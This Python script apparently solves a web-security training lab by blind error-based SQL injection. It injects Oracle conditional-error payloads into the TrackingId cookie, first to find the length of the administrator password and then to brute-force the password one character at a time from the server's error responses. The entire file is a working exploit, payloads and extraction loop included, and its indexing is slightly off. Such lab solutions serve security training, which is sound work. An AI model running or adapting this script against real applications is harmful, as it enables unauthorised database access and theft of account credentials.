import requests
import time
import sys

class SolveSqli:
    
    def __init__(self):
        self.passLenght = 0
        self.url = "https://0af300610393ad288156027700f200ba.web-security-academy.net/filter?category=Corporate+gifts"

    def runRequest(self, TrackingId="", check=""):
        resp = requests.get(self.url, cookies={"TrackingId":TrackingId, "session":"l5NyKiPfICk0TTI4vUpQEnnlyu3x5Bk2"})
        return resp.status_code == 500

    def getPassLenght(self):
        for i in range(1,100):
            TrackingId=f"xyz'||(SELECT CASE WHEN LENGTH(password)>={i} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            resp = self.runRequest(TrackingId=TrackingId, check="Welcome back!")
            sys.stdout.write(f"\r\rTrying Password Lenght  {i}")
            sys.stdout.flush()
            # time.sleep(0.01)
            if resp == True:
                self.passLenght = i
            else:
                sys.stdout.write(f"\r\r\nFound pass lenght is : {self.passLenght}\n")
                sys.stdout.flush()
                # time.sleep(0.01)
                break

    def bruteForcePassword(self):
        password = ""
        charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        for i in range(21):
            for char in charset:
                TrackingId=f"YiWwK1pD3ZIX3KJ0'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
                res = self.runRequest(TrackingId=TrackingId, check="Welcome back!")
                sys.stdout.write(f"\r\rTrying {char} at index {i} : payload : {TrackingId}")
                sys.stdout.flush()
                if res == True:
                    # sys.stdout.write(f"\r\rFound {i} - {char} \n")
                    # sys.stdout.flush()
                    password += char
                    break
            if password == "":
                print("First Char not found please exit and check you script and pyload") #raise Exception('Some thing wrong with the script')
        print("PAssword Found : "+password if password!="" else "Password Not Found")





x = SolveSqli()
x.getPassLenght()
x.bruteForcePassword()